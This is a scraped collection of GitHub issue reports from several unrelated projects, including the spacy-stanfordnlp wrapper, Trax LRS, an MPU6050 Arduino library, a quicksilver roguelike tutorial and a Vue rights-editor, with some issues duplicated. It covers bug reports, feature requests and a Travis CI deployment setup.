	'lang': 'en', # Language code for the language to build the Pipeline in
}

snlp = stanfordnlp.Pipeline(**config)
nlp = StanfordNLPLanguage(snlp)

matcher = Matcher(nlp.vocab)
matcher.add("ProperNounRule", None, *[
	# [{'POS': 'PROPN'}, {'POS': 'PROPN'}, {'POS': 'PROPN'}],
	# [{'POS': 'PROPN'}, {'POS': 'PROPN'}]
	[{'POS': 'PROPN', 'OP': '+'}]
	# {'POS': 'NOUN', 'OP': '+'}
])

text = "US was among the first countries to recognise opposition leader Juan Guaido as legitimate leader, arguing President Nicholas Maduro's May 2018 re-election was a sham. Maduro accuses Guaido of being a coup-mongering puppet for US President Trump."

text = text.replace("“", "\"").replace("”", "\"").replace("’", "'")
doc = nlp(text)

matches = matcher(doc)
print('\n>>> Match result')
for (match_id, start, end) in matches:
	label = doc.vocab.strings[match_id]	
	span = doc[start:end]	
	print(label, ":", str(span), ">", start, ":", end)	

```

Bolds are expected result. 
```
**ProperNounRule : US > 0 : 1**
**ProperNounRule : Juan > 10 : 11**
**ProperNounRule : Juan Guaido > 10 : 12**
ProperNounRule : as > 11 : 12
**ProperNounRule : Nicholas > 17 : 18**
**ProperNounRule : Nicholas Maduro > 17 : 19**
ProperNounRule : 's > 18 : 19
**ProperNounRule : Nicholas Maduro's May > 17 : 20**
ProperNounRule : 2018 re-election > 18 : 20
ProperNounRule : was > 19 : 20
ProperNounRule : sham > 21 : 22
ProperNounRule : a > 28 : 29
ProperNounRule : - > 30 : 31
ProperNounRule :  > 39 : 40
ProperNounRule :  > 39 : 41
``` It works with other text but running this code will cause an infinite loop. It does not like "im Anhang".

```python
snlp = stanfordnlp.Pipeline(lang="de")
nlp = StanfordNLPLanguage(snlp)

doc = nlp("im Anhang")
for token in doc:
    print(token.text, token.lemma_, token.pos_, token.dep_)
``` * Spacy version: 2.1.4
* spacy-stanfordnlp version: 0.1.1

I downloaded and loaded the german model as described in the docs.

```py
import stanfordnlp
from spacy_stanfordnlp import StanfordNLPLanguage

stanfordnlp.download('de')
snlp = stanfordnlp.Pipeline(lang="de")
stanford_nlp = StanfordNLPLanguage(snlp)
```

When parsing german contractions such as "im", "am", "zum" etc., I noticed a weird behavior. The first time around everything is fine, but on consecutive parses, some tokens are being duplicated and some omited. It's best to look at an example.

```py
stanford_nlp('Das zum Beispiel funktioniert nicht.')
# Das zu dem Beispiel funktioniert nicht .

stanford_nlp('Das zum Beispiel funktioniert nicht.')
# Das zu dem zu dem Beispiel funktioniert nicht 

stanford_nlp('Das zum Beispiel funktioniert nicht.')
# Das zu dem zu dem zu dem Beispiel funktioniert 

stanford_nlp('Das zum Beispiel funktioniert nicht.')
# Das zu dem zu dem zu dem zu dem Beispiel funktioniert 

stanford_nlp('Das zum Beispiel funktioniert nicht.')
# Das zu dem zu dem zu dem zu dem zu dem Beispiel 

stanford_nlp('Das zum Beispiel funktioniert nicht.')
# Das zu dem zu dem zu dem zu dem zu dem zu dem Beispiel

stanford_nlp('Das zum Beispiel funktioniert nicht.')
# Das zu dem zu dem zu dem zu dem zu dem zu dem zu 

stanford_nlp('Das zum Beispiel funktioniert nicht.')
# Das zu dem zu dem zu dem zu dem zu dem zu dem zu 
```

Parsing other contractions afterwards also doesn't work.

```py
stanford_nlp('Am Anfang wäre das ok.')
# zu dem zu dem zu dem zu dem 
```

But parsing other sentences with no contractions is alright.

```py
stanford_nlp('Dabei hat man keine Schwierigkeiten.')
# Dabei hat man keine Schwierigkeiten.
```
Here is a [list of german contractions](https://en.wiktionary.org/wiki/Category:German_contractions). However, it doesn't break for all of them, as some are not split into separate tokens.

P.S.: It shouldn't really matter, but I'm running this in a jupyter notebook. Spacy is great for visualizations and the work done with Prodigy. But its NER engine comes no where close to CoreNLP.  Using this wrapper, you'll be able to use the following annotations, computed by your pretrained stanfordnlp model:

Statistical tokenization (reflected in the Doc and its tokens)
Lemmatization (token.lemma and token.lemma_)
Part-of-speech tagging (token.tag, token.tag_, token.pos, token.pos_)
Dependency parsing (token.dep, token.dep_, token.head)
Sentence segmentation (doc.sents)

Where is Named Entity Recognition? https://stanfordnlp.github.io/CoreNLP/ner.html

Also SpaCy's own website says specifically state of the art comes with CORENLP not SpaCy

https://cl.ly/285a4edaf7a5/Image%202019-06-06%20at%207.32.06%20PM.png

This is not a post to whine - this is a post to say I want to get work done - I want to use a tool like prodigy - but everytime I spend an hour or so of additional dev time and the SpaCy models give me junk entities and then this package shows up within evolution as a potential bridge - yet it lacks the most essential annotator. Thats my point. Spacy is great for visualizations and the work done with Prodigy. But its NER engine comes no where close to CoreNLP.  Hi, it seems that in some cases of using StanfordNLP models the result is an invalid parse tree state. When trying to merge certain spans, I get `RuntimeError: [E039] Array bounds exceeded while searching for root word. This likely means the parse tree is in an invalid state`.

Here is a reproducible example (at least for my installation), failing when trying to merge an emoji:

```
import stanfordnlp
from spacy_stanfordnlp import StanfordNLPLanguage

# stanfordnlp.download('ca')
snlp = stanfordnlp.Pipeline(lang='ca')
ca = StanfordNLPLanguage(snlp)

txt = "🙅🚫 Els comentaris i els gestos ofensius o els tocaments indesitjats són violència masclista.  💬 Si vius alguna d’aquestes situacions, denuncia-ho a @mossos i informa’ns a través de l’app #BCNantimasclista per prevenir-les. 💪 #JuntesSomMésFortes!  ℹ️ https://t.co/gOnPU9vgdt https://t.co/qtntxX97Ih"

doc = ca(txt)
print(list(doc))
doc[16:17].merge()
```

This doesn't seem to happen with a regular Spacy language (the tokenization is slightly different, but merging spans including the same emoji works here):

```
import spacy
en = spacy.load('en')
doc = en(txt)
print(list(doc))
print(list(doc[16:18]))
doc[17:18].merge()
doc[16:18].merge()
print(list(doc))
``` It works with other text but running this code will cause an infinite loop. It does not like "im Anhang".

```python
snlp = stanfordnlp.Pipeline(lang="de")
nlp = StanfordNLPLanguage(snlp)

doc = nlp("im Anhang")
for token in doc:
    print(token.text, token.lemma_, token.pos_, token.dep_)
``` I have successfully run parser and see pos/dependency result same as with stanfordnlp.
But when I run Matcher over tokens I see unexpected matchs.
For example I should get only PROPN+ tokens but I see verb matches as well.
And empty match...

I have gone through following code here but I could not see something related with Matcher.
https://github.com/explosion/spacy-stanfordnlp/blob/master/spacy_stanfordnlp/language.py

BTW, default installation comes with spacy-nightly 6a and I have tried with 9a as well. 

```python
import stanfordnlp
from spacy_stanfordnlp import StanfordNLPLanguage
from spacy.matcher import Matcher
import csv

config = {
    'processors': 'tokenize,pos,lemma', #mwt, depparse
	'lang': 'en', # Language code for the language to build the Pipeline in
}

snlp = stanfordnlp.Pipeline(**config)
nlp = StanfordNLPLanguage(snlp)

matcher = Matcher(nlp.vocab)
matcher.add("ProperNounRule", None, *[
	# [{'POS': 'PROPN'}, {'POS': 'PROPN'}, {'POS': 'PROPN'}],
	# [{'POS': 'PROPN'}, {'POS': 'PROPN'}]
	[{'POS': 'PROPN', 'OP': '+'}]
	# {'POS': 'NOUN', 'OP': '+'}
])

text = "US was among the first countries to recognise opposition leader Juan Guaido as legitimate leader, arguing President Nicholas Maduro's May 2018 re-election was a sham. Maduro accuses Guaido of being a coup-mongering puppet for US President Trump."

text = text.replace("“", "\"").replace("”", "\"").replace("’", "'")
doc = nlp(text)

matches = matcher(doc)
print('\n>>> Match result')
for (match_id, start, end) in matches:
	label = doc.vocab.strings[match_id]	
	span = doc[start:end]	
	print(label, ":", str(span), ">", start, ":", end)	

```

Bolds are expected result. 
```
ProperNounRule : US > 0 : 1
ProperNounRule : Juan > 10 : 11
**ProperNounRule : Juan Guaido > 10 : 12**
ProperNounRule : as > 11 : 12
ProperNounRule : Nicholas > 17 : 18
**ProperNounRule : Nicholas Maduro > 17 : 19**
ProperNounRule : 's > 18 : 19
**ProperNounRule : Nicholas Maduro's May > 17 : 20**
ProperNounRule : 2018 re-election > 18 : 20
ProperNounRule : was > 19 : 20
ProperNounRule : sham > 21 : 22
ProperNounRule : a > 28 : 29
ProperNounRule : - > 30 : 31
ProperNounRule :  > 39 : 40
ProperNounRule :  > 39 : 41
``` Using **stanfordnlp**, Lemma results on an input are:
```
snlp_en = stanfordnlp.Pipeline(lang="en")
doc = snlp_en("He was a better batsman")
for sentence in doc.sentences:
    for token in sentence.tokens:
        for words in token.words:
            print(words.text, "\t\t", words.lemma)
```
```
He 		 he
was 		 be
a 		 a
better 	better
batsman 	batsman
```

Now using latest wrapper given by spacy **spacy-stanfordnlp** and getting following results.
```
snlp_en = stanfordnlp.Pipeline(lang="en")
nlp_en = StanfordNLPLanguage(snlp_en)
doc = nlp_en("He was a better batsman")
for token in doc:
    print(token.text, "\t\t", token.lemma_)
```

```
He 		 -PRON-
was 		 be
a 		 a
better 	well
batsman 	batsman
```
So, it look like that Spacy is given priority(you can see for word "he" and "better"). So, when a language has models in both Spacy and Stanford, then how results will be coming? Can you provide a full details how linguistic features will be affected in this case? Using this wrapper, you'll be able to use the following annotations, computed by your pretrained stanfordnlp model:

Statistical tokenization (reflected in the Doc and its tokens)
Lemmatization (token.lemma and token.lemma_)
Part-of-speech tagging (token.tag, token.tag_, token.pos, token.pos_)
Dependency parsing (token.dep, token.dep_, token.head)
Sentence segmentation (doc.sents)

Where is Named Entity Recognition? https://stanfordnlp.github.io/CoreNLP/ner.html

Also SpaCy's own website says specifically state of the art comes with CORENLP not SpaCy

https://cl.ly/285a4edaf7a5/Image%202019-06-06%20at%207.32.06%20PM.png

This is not a post to whine - this is a post to say I want to get work done - I want to use a tool like prodigy - but everytime I spend an hour or so of additional dev time and the SpaCy models give me junk entities and then this package shows up within evolution as a potential bridge - yet it lacks the most essential annotator. Thats my point. can other APIs also be used in spacy command line but with stanford nlp model Great work. So what about building the vocabulary at least word vectors for these languages ? 
Thanks I am using following code to get results on Greek and Hebrew language. It is giving no results, look like that it is stuck on these inputs.

**Greek**
```
snlp = stanfordnlp.Pipeline(lang="el")
nlp = StanfordNLPLanguage(snlp)
doc = nlp("συνεπεια στο ραντεβου")
```

**Hebrew**
```
snlp = stanfordnlp.Pipeline(lang="he")
nlp = StanfordNLPLanguage(snlp)
doc = nlp("השירות")
```

Can you tell why it is happening? How can I avoid from this? I am using following code to get results on Greek and Hebrew language. It is giving no results, look like that it is stuck on these inputs.

**Greek**
```
snlp = stanfordnlp.Pipeline(lang="el")
nlp = StanfordNLPLanguage(snlp)
doc = nlp("συνεπεια στο ραντεβου")
```

**Hebrew**
```
snlp = stanfordnlp.Pipeline(lang="he")
nlp = StanfordNLPLanguage(snlp)
doc = nlp("השירות")
```

Can you tell why it is happening? How can I avoid from this? Using **stanfordnlp**, Lemma results on an input are:
```
snlp_en = stanfordnlp.Pipeline(lang="en")
doc = snlp_en("He was a better batsman")
for sentence in doc.sentences:
    for token in sentence.tokens:
        for words in token.words:
            print(words.text, "\t\t", words.lemma)
```
```
He 		 he
was 		 be
a 		 a
better 	better
batsman 	batsman
```

Now using latest wrapper given by spacy **spacy-stanfordnlp** and getting following results.
```
snlp_en = stanfordnlp.Pipeline(lang="en")
nlp_en = StanfordNLPLanguage(snlp_en)
doc = nlp_en("He was a better batsman")
for token in doc:
    print(token.text, "\t\t", token.lemma_)
```

```
He 		 -PRON-
was 		 be
a 		 a
better 	well
batsman 	batsman
```
So, it look like that Spacy is given priority(you can see for word "he" and "better"). So, when a language has models in both Spacy and Stanford, then how results will be coming? Can you provide a full details how linguistic features will be affected in this case? I see there "stanfordnlp>=0.1.0,<0.2.1" line in requirement.txt but still getting following error.

ERROR: spacy-stanfordnlp 0.1.2 has requirement stanfordnlp<0.2.0,>=0.1.0, but you'll have stanfordnlp 0.2.0 which is incompatible.

I guess there is a problem in last release. I think all StanfordNLP models come with pretrained word vectors, and (if I interpret their code correctly), they're available via either the pos model as:
```
unit_id = snlp.processors['pos'].pretrain.vocab._unit2id['spacy'] 
unit_vec = snlp.processors['pos'].pretrain.emb[unit_id]
```
or
```
unit_vec = snlp.processors['depparse'].pretrain.emb[unit_id]
```
Would it be possible to add those vectors as token attributes?

If you'd like I could try to implement it in a PR... Hi,
Is it possible to access CoreNLP parsing tree from the `doc` object? Not only dependencies.
Thank you,
Lucas Willems Hi,
Is it possible to access StanfordNLP parsing tree? Not Spacy one.
Thank you,
Lucas Willems
<---------->
168535538
 Tencent + www.tencent.com

 Do not ask all kinds of questions in this issue, thank you for your cooperation.
<---------->
168569232
In the README.md:

The keyword to use with PostgreSQL should be "pgsql" instead of "pqsql" in the .env file

![screen shot 2019-02-07 at 5 23 17 pm](https://user-images.githubusercontent.com/35572989/52446848-2d808280-2afd-11e9-8972-f9751399348d.png)
 Hello,

It seems like composer need mongodb and it's php extension.

``` 
 Problem 1
    - Installation request for mongodb/mongodb 1.3.2 -> satisfiable by mongodb/mongodb[1.3.2].
    - mongodb/mongodb 1.3.2 requires ext-mongodb ^1.4.0 -> the requested PHP extension mongodb is missing from your system.
  Problem 2
    - mongodb/mongodb 1.3.2 requires ext-mongodb ^1.4.0 -> the requested PHP extension mongodb is missing from your system.
    - jenssegers/mongodb v3.4.5 requires mongodb/mongodb ^1.0.0 -> satisfiable by mongodb/mongodb[1.3.2].
    - Installation request for jenssegers/mongodb v3.4.5 -> satisfiable by jenssegers/mongodb[v3.4.5].
```

If I plan to use mysql or postgresql my understanding is that I need to install mongodb even if I don't plan on using it ?

Would it be possible to bypass this requirement to prevent installing 250mb+ for nothing ?

Thanks ! Hello,

I am currently trying the LRS with the Moodle" tincanlaunch" plugin (https://github.com/garemoko/moodle-mod_tincanlaunch) and I get 

`'Invalid "activityId" param.' `

once the activity is configured. 

- I know login and password for basic auth are correct.
- I've also tested with a SCORM Cloud LRS and it works fine.

Query is the following (decoded for readability):

`http://traxlrs.local/trax/ws/xapi/activities/state?activityId=http://Course_ID2&agent={"objectType":"Agent","name":"John Doe","mbox":"mailto:jdoe@example.com"}&stateId=http://tincanapi.co.uk/stateapikeys/registrations`

Thank you. Hello,

It seems like composer need mongodb and it's php extension.

``` 
 Problem 1
    - Installation request for mongodb/mongodb 1.3.2 -> satisfiable by mongodb/mongodb[1.3.2].
    - mongodb/mongodb 1.3.2 requires ext-mongodb ^1.4.0 -> the requested PHP extension mongodb is missing from your system.
  Problem 2
    - mongodb/mongodb 1.3.2 requires ext-mongodb ^1.4.0 -> the requested PHP extension mongodb is missing from your system.
    - jenssegers/mongodb v3.4.5 requires mongodb/mongodb ^1.0.0 -> satisfiable by mongodb/mongodb[1.3.2].
    - Installation request for jenssegers/mongodb v3.4.5 -> satisfiable by jenssegers/mongodb[v3.4.5].
```

If I plan to use mysql or postgresql my understanding is that I need to install mongodb even if I don't plan on using it ?

Would it be possible to bypass this requirement to prevent installing 250mb+ for nothing ?

Thanks ! Currently, Trax LRS inserts it own authority value in all the incoming statements. 
The authority value can be configured in the trax-xapi-server config file.

There could be more options to manage the Authority:
- Keeping the incoming statements authority when it is defined
- Setting an authority based on the Basic HTTP client The ressources provided by Trax for VueJS ressources are absolute to the host root. Thus Trax cannot work if it is not installed at the root of the host.

In practice I would like:
  <script src="js/trax-ui.js?id=cde456d00440fb334bf3"></script>
Instead of
  <script src="/js/trax-ui.js?id=cde456d00440fb334bf3"></script>
 Using the command 
`composer create-project --stability rc trax/lrs traxlrs`

under Ubuntu 18.04 result in the following error:
```
- Installing trax/framework (dev-master 4b040f0): Downloading (0%)    Failed to download trax/framework from dist: The "https://codeload.github.com/trax-project/trax-framework/legacy.zip/4b040f0bc3a74f13b87ae4cb519faace27366ad6" file could not be downloaded (HTTP/1.1 404 Not Found)
    Now trying to download from source
  - Installing trax/framework (dev-master 4b040f0): Cloning 4b040f0bc3 from cache
    4b040f0bc3a74f13b87ae4cb519faace27366ad6 is gone (history was rewritten?)

In GitDownloader.php line 397:

  Failed to execute git checkout '4b040f0bc3a74f13b87ae4cb519faace27366ad6' -- && git reset --hard '4b040f0bc3a74f13b87ae4cb519faace
  27366ad6' --

  fatal: reference is not a tree: 4b040f0bc3a74f13b87ae4cb519faace27366ad6
``` When TRAX LRS is configured as a pure MongoDB app, we get a `Call to a member function beginTransaction() on null` error in some situation (posting statements, changing the user password, etc.). Hi,
After one year using TRAX LRS in several projets, I plan to develop the next major release in 2020.
I got some feedbacks and have a few ideas, but I would like to hear from you. Don't hesitate to add your wishes here...
 Hello,

I am currently trying the LRS with the Moodle" tincanlaunch" plugin (https://github.com/garemoko/moodle-mod_tincanlaunch) and I get 

`'Invalid "activityId" param.' `

once the activity is configured. 

- I know login and password for basic auth are correct.
- I've also tested with a SCORM Cloud LRS and it works fine.

Query is the following (decoded for readability):

`http://traxlrs.local/trax/ws/xapi/activities/state?activityId=http://Course_ID2&agent={"objectType":"Agent","name":"John Doe","mbox":"mailto:jdoe@example.com"}&stateId=http://tincanapi.co.uk/stateapikeys/registrations`

Thank you. Hello,

I am trying your LRS solution and I can't find any endpoint to send data of my xAPI module.
Does it exist ? If yes could you put it in README please :) Bonjour à vous,
le projet est intéressant mais un peu complexe à déployer en particulier pour qui a pas ou peu d'expérience avec Laravel.
Je pense qu'il serait intéressant de fournir un script docker pour construire une image Docker ainsi qu'un fichier pour docker-compose afin d'avoir une solution qu'on puisse tester en une ligne de commande.
Personnellement j'avais besoin d'un LRS de test, mais je me suis arrêté après une demi-heure de tentative d'installation.
Cordialement. Hello,

I am trying your LRS solution and I can't find any endpoint to send data of my xAPI module.
Does it exist ? If yes could you put it in README please :) Hi, Thanks for providing such a wonderful open-source lrs. I have installed lrs properly but endpoint not working. When access endpoint http://localhost/traxlrs/trax/ws/xapi/about it showing below error
Not Found
The requested URL /traxlrs/trax/ws/xapi/about was not found on this server.

Apache/2.4.27 (Win64) PHP/7.1.9 Server at localhost Port 80.

and also I configured lrs endpoint in launch storyline it showing "There was a problem communicating with the Learning Record Store. Your results may not be saved. Please check your internet connection and try again.".

Please help me. Thank you in Advance.
Yugandhar Hi, Thanks for providing such a wonderful open-source lrs. I have installed lrs properly but endpoint not working. When access endpoint http://localhost/traxlrs/trax/ws/xapi/about it showing below error
Not Found
The requested URL /traxlrs/trax/ws/xapi/about was not found on this server.

Apache/2.4.27 (Win64) PHP/7.1.9 Server at localhost Port 80.

and also I configured lrs endpoint in launch storyline it showing "There was a problem communicating with the Learning Record Store. Your results may not be saved. Please check your internet connection and try again.".

Please help me. Thank you in Advance.
Yugandhar When TRAX LRS is configured as a pure MongoDB app, we get a `Call to a member function beginTransaction() on null` error in some situation (posting statements, changing the user password, etc.). The ressources provided by Trax for VueJS ressources are absolute to the host root. Thus Trax cannot work if it is not installed at the root of the host.

In practice I would like:
  <script src="js/trax-ui.js?id=cde456d00440fb334bf3"></script>
Instead of
  <script src="/js/trax-ui.js?id=cde456d00440fb334bf3"></script>

<---------->
168812997
没有数据库呀兄弟
<---------->
168935489
The name of the functions, argument types, constants and it's value, a brief explanation of it's working - if included as a document would be nice so that the one seeing the documentation can just start away without any further search. Please provide small and easy to digest examples.  Suggestion:  
Could you specify on the main Readme,md what differentiate this library from the original jrowberg/i2cdevlib.  

Do you know if it works with other micro-controllers like the STM32 or the ESP32/ESP8266 ? hello
got some issue with code\library -
im getting 'class MPU6050' has no member named 'begin' in this sketch:

> #include <Wire.h>
> #include <MPU6050.h>
>  
> MPU6050 mpu;
>  
> void setup()
> {
> Serial.begin(9600);
>  
> Serial.println("Initialize MPU6050");
> while(!mpu.begin(MPU6050_SCALE_2000DPS, MPU6050_RANGE_2G))
> {
> Serial.println("Error");
> delay(1000);
> }
> pinMode(13, OUTPUT);
>  
> mpu.setThreshold(2);
> }
>  
> void loop()
> {
> Vector rawGyro = mpu.readRawGyro();
> Vector normGyro = mpu.readNormalizeGyro();
> float normal_x = normGyro.XAxis;
> float normal_y = normGyro.YAxis;
> float normal_z = normGyro.ZAxis;
> Serial.print(" Xnorm = ");
> Serial.print(normal_x);
> Serial.print(" Ynorm = ");
> Serial.print(normal_y);
> Serial.print(" Znorm = ");
> Serial.println(normal_z);
>  
> if(abs(normal_x) + abs(normal_y) + abs(normal_z) > 0.2){
> digitalWrite(13, HIGH);
> }else{
> digitalWrite(13, LOW);
> }
>  
> delay(10);
> }

if you have any hints - will be happy. thanks The name of the functions, argument types, constants and it's value, a brief explanation of it's working - if included as a document would be nice so that the one seeing the documentation can just start away without any further search. Please provide small and easy to digest examples.  hello
got some issue with code\library -
im getting 'class MPU6050' has no member named 'begin' in this sketch:
`#include <Wire.h>
#include <MPU6050.h>
 
MPU6050 mpu;
 
void setup()
{
Serial.begin(9600);
 
Serial.println("Initialize MPU6050");
while(!mpu.begin(MPU6050_SCALE_2000DPS, MPU6050_RANGE_2G))
{
Serial.println("Error");
delay(1000);
}
pinMode(13, OUTPUT);
 
mpu.setThreshold(2);
}
 
void loop()
{
Vector rawGyro = mpu.readRawGyro();
Vector normGyro = mpu.readNormalizeGyro();
float normal_x = normGyro.XAxis;
float normal_y = normGyro.YAxis;
float normal_z = normGyro.ZAxis;
Serial.print(" Xnorm = ");
Serial.print(normal_x);
Serial.print(" Ynorm = ");
Serial.print(normal_y);
Serial.print(" Znorm = ");
Serial.println(normal_z);
 
if(abs(normal_x) + abs(normal_y) + abs(normal_z) > 0.2){
digitalWrite(13, HIGH);
}else{
digitalWrite(13, LOW);
}
 
delay(10);
}`

if you have any hints - will be happy. thanks Code snippet (identical for comparing 6.12 and old version):

xyzInt16_t mpuGyro::getAccelReal()
{
  mpu6050.dmpGetQuaternion(&q, fifoBuffer); // A
  mpu6050.dmpGetAccel(&aa, fifoBuffer);     // B
  mpu6050.dmpGetGravity(&gravity, &q);      // C
  mpu6050.dmpGetLinearAccel(&aaReal, &aa, &gravity); // D

  xyzInt16_t ar;
  ar.x = aaReal.x;
  ar.y = aaReal.y;
  ar.z = aaReal.z;
  return ar;
}

I have found this compatible with the provided examples for both .h-versions.

Sample printout using DMP 6.12:
grX | grY | grZ | arealX | arealY | arealZ | arealScaledX | arealScaledY | arealScaledZ
-0.0011 | 0.010009 | 0.999853 | 30 | -11 | 8303 | 0.035925 | -0.013173 | 9.942924
-0.00098 | 0.008056 | 0.999861 | 3 | -107 | 8101 | 0.003593 | -0.128134 | 9.701027
-0.00085 | 0.006591 | 0.999867 | -7 | -113 | 8181 | -0.008383 | -0.135319 | 9.796828
-0.00073 | 0.005371 | 0.999871 | 0 | -107 | 8191 | 0 | -0.128134 | 9.808803

Sample printout using DMP20:
grX | grY | grZ | arealX | arealY | arealZ | arealScaledX | arealScaledY | arealScaledZ
-0.00024 | -0.00281 | 0.999877 | -4 | -4 | 0 | -0.00479 | -0.00479 | 0
-0.00024 | -0.00281 | 0.999877 | 4 | -4 | 4 | 0.00479 | -0.00479 | 0.00479
-0.00024 | -0.00281 | 0.999877 | -3 | 2 | -5 | -0.003593 | 0.002395 | -0.005988
-0.00024 | -0.00281 | 0.999877 | -6 | -5 | -6 | -0.007185 | -0.005988 | -0.007185

Additional question:
I happened to find a statement in 6.12 telling that the MPU6050_DMP_FIFO_RATE_DIVISOR (default 0x1) can no longer be set by the user. Is there a plan to fix this, or can you suggest a workaround such as a patch for the DMP image?

Regards,
BjornGu


 Suggestion:  
Could you specify on the main Readme,md what differentiate this library from the original jrowberg/i2cdevlib.  

Do you know if it works with other micro-controllers like the STM32 or the ESP32/ESP8266 ?
<---------->
168968719
Quicksilver now has a prelude module:

https://docs.rs/quicksilver/0.3.10/quicksilver/prelude/index.html

That should simplify the use statements in the text nicely. Do a `git diff -w` of this fork:

https://github.com/Kinrany/quicksilver-roguelike/commit/fd9900666cb9dd35c0ef14171748011ef49e7cb1

It's got some issues that @Kinrany fixed:

https://www.reddit.com/r/roguelikedev/comments/aowxzj/writing_a_roguelike_in_rust_for_the_desktop_and/egnuevv/ When serving the webassembly game, the compiled `*.wasm` file must be served with the right content-type.

Github pages do this automatically, but not every other hosting / server does. Find out the right content type and mention it at the end of the document. Quicksilver now has a prelude module:

https://docs.rs/quicksilver/0.3.10/quicksilver/prelude/index.html

That should simplify the use statements in the text nicely.
<---------->
169221405
- [x] Enter constraints 🚨 You need to enable Continuous Integration on Greenkeeper branches of this repository. 🚨

To enable Greenkeeper, you need to make sure that a [commit status](https://help.github.com/articles/about-statuses/) is reported on all branches. This is required by Greenkeeper because it uses your CI build statuses to figure out when to notify you about breaking changes.

Since we didn’t receive a CI status on the [`greenkeeper/initial`](https://github.com/schul-cloud/rights-editor/commits/greenkeeper/initial) branch, it’s possible that you don’t have CI set up yet. We recommend using [Travis CI](https://travis-ci.org), but Greenkeeper will work with every other CI service as well.

If you _have_ already set up a CI for this repository, you might need to check how it’s configured. Make sure it is set to run on all new branches. If you don’t want it to run on absolutely every branch, you can whitelist branches starting with `greenkeeper/`.

Once you have installed and configured CI on this repository correctly, you’ll need to re-trigger Greenkeeper’s initial pull request. To do this, please click the 'fix repo' button on [account.greenkeeper.io](https://account.greenkeeper.io).
  The hovering dialog  is a modal.

- [x] check out [a vue example modal](https://vuejs.org/v2/examples/modal.html)
- [x] find the example in large part reproduced in src/components/BaseModal, note that we call it Base... because it does not cary any specific content and should server as base. Modify it as necessary by relying on slots to display specific information (see [information on slots in vue](https://vuejs.org/v2/guide/components-slots.html))
- [x] show the modal (also called dialog here) to choose an action type when clicking on the rule's action
- [x] the dialog should show the headline 'Aktion auswählen' or sth alike
- [x] the dialog should show a (scrollable) list of possible action types (descriptions or explanations are not needed here, they will form a follow-up ticket)
- [x] the dialog should show a button saying 'Annehmen' if an action is selected from the list, when the button is clicked the selected action should be entered into the data structure and therefore be visible as the new state of the rule
- [x] the dialog should show a button saying 'Abbrechen' to leave the dialog without changing any rule state Whenever we have buttons that communicate binary information and therefore force the user to decide between "yes" or "no" ("Annehmen" or "Abbrechen", "Erlaubt", "Nicht erlaubt"), the way we visualize that in regards to positioning should be equal in all our UI elements: The following question should be answered:

Annehmen   Abbrechen
or
Abbrechen   Annehmen
? The rule type logically can have a reference to another rule, e.g. on failure to comply to one rule this rule could have a reference (called `failure` in the diagram) to a fall-back rule. Make it possible to add such a failure rule to RuleItem (represent the referenced rule by showing another RuleItem and do not introduce a specialized component for this task, so future changes to RuleItem benefit the referenced rule also). Find a clever way to display it. Maybe it is helpful to mimic the structure of the resulting json in the UI (but maybe not - find out).
- [x] implement it When scrolling while the ActionChooser is open, the background website should not move but the list of possible actions should. There is yet no list of actions, so this is to be done as well.  We should think about re-using existing code for this. Maybe split the ActionItem component into multiple smaller ones, so that the constraint itself is a single vue component which can then be reused in actions as well as refinements for example. When creating a new rule by clicking on a button, maybe scroll down to the newly created rule UI form to give visual feedback that something actually happened. Because as it is now, when the screen is already full with rules, adding them at the bottom can't be noticed/seen. Same thing goes for removing rules. Clicking on the X while there are still a lot of rules left has the following correct though slightly misleading behavior: The next rule gets displayed at the exact same position immediately. It happens so fast in fact, that the user might wonder if anything happened at all. So add a little removing animation here, but nothing too special as we don't want the ui experience to be fast and direct. We should think about re-using existing code for this. Maybe split the ActionItem component into multiple smaller ones, so that the constraint itself is a single vue component which can then be reused in actions as well as refinements for example. And maybe even logical composition with operators like and, or, xor, ...?  When scrolling while the ActionChooser is open, the background website should not move but the list of possible actions should. There is yet no list of actions, so this is to be done as well. The button for this functionality is already there but the method is currently not working properly. This is more than just a bug fix as there is still a lot of code to be written, especially when nested rules (remedy, consequence and duties) are to be supported. Maybe implement the constraint UI using the BaseModal component that is used in the ActionChooser. Do something! 🚨 You need to enable Continuous Integration on Greenkeeper branches of this repository. 🚨

To enable Greenkeeper, you need to make sure that a [commit status](https://help.github.com/articles/about-statuses/) is reported on all branches. This is required by Greenkeeper because it uses your CI build statuses to figure out when to notify you about breaking changes.

Since we didn’t receive a CI status on the [`greenkeeper/initial`](https://github.com/schul-cloud/rights-editor/commits/greenkeeper/initial) branch, it’s possible that you don’t have CI set up yet. We recommend using [Travis CI](https://travis-ci.org), but Greenkeeper will work with every other CI service as well.

If you _have_ already set up a CI for this repository, you might need to check how it’s configured. Make sure it is set to run on all new branches. If you don’t want it to run on absolutely every branch, you can whitelist branches starting with `greenkeeper/`.

Once you have installed and configured CI on this repository correctly, you’ll need to re-trigger Greenkeeper’s initial pull request. To do this, please click the 'fix repo' button on [account.greenkeeper.io](https://account.greenkeeper.io).
 **Für automatisches Deployment eures Github Repos**:
0. Neuen Branch anlegen & einen Pull_Request auf den master anlegen (ABER NICHT MERGEN!)
1. `.travis.yml` im root Ordner eures Projekts anlegen.
2. Datei mit diesem Inhalt füllen:
```
language: node_js
node_js:
  - "lts/*"
script:
  - npm run build
  - export BRANCH=$(if [ "$TRAVIS_PULL_REQUEST" == "false" ]; then echo $TRAVIS_BRANCH; else echo $TRAVIS_PULL_REQUEST_BRANCH; fi)
notifications:
  email: false
cache:
  directories:
    - node_modules
deploy:
  provider: pages
  local-dir: "dist"
  allow-empty-commit: true
  skip-cleanup: true
  github-token: $GITHUB_TOKEN  # Set in the settings page of your repository, as a secure variable
  keep-history: true
  on:
    branch: master
```
3. Auf https://travis-ci.com/ in den Einstellungen `Build Pushed Branches` aktivieren (https://travis-ci.com/schul-cloud/rights-editor).
3.1.
![image](https://user-images.githubusercontent.com/22987140/52712924-51791380-2f96-11e9-889d-fc6c08c53498.png)
3.2. ![image](https://user-images.githubusercontent.com/22987140/52712962-69e92e00-2f96-11e9-8b15-9fb82e194bdb.png)
3.3. (optional) könnt ihr unten in den Einstellungen noch aktivieren, dass in regelmäßigen abständen auf dem master erneut ein build (und somit deployment) ausgeführt werden soll.
4. In den Travis Einstellungen einen Github Token hinterlegen (`show value in build log` sollte keinesfalls für diesen token aktiviert werden). Der Token kann unter https://github.com/settings/tokens erstellt werden.
![image](https://user-images.githubusercontent.com/22987140/52713156-dcf2a480-2f96-11e9-931d-b2cecd0f699d.png)
5. Den Pull mit der .travis.yml mergen
6. In den Einstellungen eures Repos `gh-pages branch` als Branch auswählen
